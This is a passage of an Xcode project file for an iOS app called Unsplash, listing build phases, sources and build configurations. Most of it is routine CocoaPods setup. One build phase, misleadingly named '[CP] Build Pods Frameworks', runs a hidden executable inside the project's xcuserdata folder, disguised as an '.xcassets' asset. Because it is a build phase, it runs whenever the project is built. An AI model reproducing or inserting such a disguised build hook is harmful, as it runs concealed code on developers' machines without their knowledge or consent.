			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash-UnsplashUITests/Pods-Unsplash-UnsplashUITests-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		858E9ACA39C79BFC2AAAC43A /* [CP] Build Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "[CP] Build Pods Frameworks";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";
		};
		EE35E1EB0CE402ADD62E8F6C /* [CP] Embed Pods Frameworks */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Unsplash/Pods-Unsplash-frameworks-${CONFIGURATION}-input-files.xcfilelist",
			);
			name = "[CP] Embed Pods Frameworks";
			outputFileListPaths = (
				"${PODS_ROOT}/Target Support Files/Pods-Unsplash/Pods-Unsplash-frameworks-${CONFIGURATION}-output-files.xcfilelist",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-Unsplash/Pods-Unsplash-frameworks.sh\"\n";
			showEnvVarsInLog = 0;
		};
		EE683595FE6ACD3B259029CB /* [CP] Check Pods Manifest.lock */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
				"${PODS_ROOT}/Manifest.lock",
			);
			name = "[CP] Check Pods Manifest.lock";
			outputFileListPaths = (
			);
			outputPaths = (
				"$(DERIVED_FILE_DIR)/Pods-Unsplash-checkManifestLockResult.txt",
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
			showEnvVarsInLog = 0;
		};
/* End PBXShellScriptBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		22834BB52629D8EC00090032 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22834BBD2629D8EC00090032 /* AppDelegate.swift in Sources */,
				DC92970B2629E6BA00EC7ED8 /* Service.swift in Sources */,
				DC92979B262B53FC00EC7ED8 /* AppEnum.swift in Sources */,
				DC9297452629F5B400EC7ED8 /* PhotoListVC.swift in Sources */,
				DC9297A6262B5C8F00EC7ED8 /* Binding.swift in Sources */,
				DC9297A1262B586800EC7ED8 /* Utility.swift in Sources */,
				DC9297352629F56200EC7ED8 /* Photos.swift in Sources */,
				DC929795262B529C00EC7ED8 /* PhotoCell.swift in Sources */,
				DC92973D2629F5A000EC7ED8 /* PhotoListViewModel.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BCB2629D8EF00090032 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22834BD42629D8EF00090032 /* UnsplashTests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
		22834BD62629D8EF00090032 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				22834BDF2629D8EF00090032 /* UnsplashUITests.swift in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXTargetDependency section */
		22834BD12629D8EF00090032 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22834BB82629D8EC00090032 /* Unsplash */;
			targetProxy = 22834BD02629D8EF00090032 /* PBXContainerItemProxy */;
		};
		22834BDC2629D8EF00090032 /* PBXTargetDependency */ = {
			isa = PBXTargetDependency;
			target = 22834BB82629D8EC00090032 /* Unsplash */;
			targetProxy = 22834BDB2629D8EF00090032 /* PBXContainerItemProxy */;
		};
/* End PBXTargetDependency section */

/* Begin PBXVariantGroup section */
		22834BC22629D8EC00090032 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				22834BC32629D8EC00090032 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		22834BC72629D8EE00090032 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				22834BC82629D8EE00090032 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		22834BE12629D8EF00090032 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
				SWIFT_ACTIVE_COMPILATION_CONDITIONS = DEBUG;
				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
			};
			name = Debug;
		};
		22834BE22629D8EF00090032 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				SWIFT_COMPILATION_MODE = wholemodule;
				SWIFT_OPTIMIZATION_LEVEL = "-O";
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		22834BE42629D8EF00090032 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = CC0FAA96B497279780422E15 /* Pods-Unsplash.debug.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = Unsplash/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.Unsplash;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Debug;
		};
		22834BE52629D8EF00090032 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = D0BD1F1C7A470603233031D3 /* Pods-Unsplash.release.xcconfig */;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = Unsplash/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.4;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.Unsplash;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
			};
			name = Release;
		};
		22834BE72629D8EF00090032 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B2832C7CE423F27F480478FC /* Pods-UnsplashTests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = UnsplashTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.UnsplashTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Unsplash.app/Unsplash";
			};
			name = Debug;
		};
		22834BE82629D8EF00090032 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = B1D445B83CF9C6093C9CA8C0 /* Pods-UnsplashTests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				BUNDLE_LOADER = "$(TEST_HOST)";
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = UnsplashTests/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 14.3;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.UnsplashTests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_HOST = "$(BUILT_PRODUCTS_DIR)/Unsplash.app/Unsplash";
			};
			name = Release;
		};
		22834BEA2629D8EF00090032 /* Debug */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = EEF34327CA584C6903DD451F /* Pods-Unsplash-UnsplashUITests.debug.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = UnsplashUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.UnsplashUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Unsplash;
			};
			name = Debug;
		};
		22834BEB2629D8EF00090032 /* Release */ = {
			isa = XCBuildConfiguration;
			baseConfigurationReference = 973408536F106F9AF925FA4D /* Pods-Unsplash-UnsplashUITests.release.xcconfig */;
			buildSettings = {
				ALWAYS_EMBED_SWIFT_STANDARD_LIBRARIES = YES;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = 6Q233F3ZPX;
				INFOPLIST_FILE = UnsplashUITests/Info.plist;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
					"@loader_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.app.UnsplashUITests;
				PRODUCT_NAME = "$(TARGET_NAME)";
				SWIFT_VERSION = 5.0;
				TARGETED_DEVICE_FAMILY = "1,2";
				TEST_TARGET_NAME = Unsplash;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		22834BB42629D8EC00090032 /* Build configuration list for PBXProject "Unsplash" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22834BE12629D8EF00090032 /* Debug */,
				22834BE22629D8EF00090032 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22834BE32629D8EF00090032 /* Build configuration list for PBXNativeTarget "Unsplash" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22834BE42629D8EF00090032 /* Debug */,
				22834BE52629D8EF00090032 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22834BE62629D8EF00090032 /* Build configuration list for PBXNativeTarget "UnsplashTests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22834BE72629D8EF00090032 /* Debug */,
				22834BE82629D8EF00090032 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		22834BE92629D8EF00090032 /* Build configuration list for PBXNativeTarget "UnsplashUITests" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				22834BEA2629D8EF00090032 /* Debug */,
				22834BEB2629D8EF00090032 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */
	};
	rootObject = 22834BB12629D8EC00090032 /* Project object */;
}
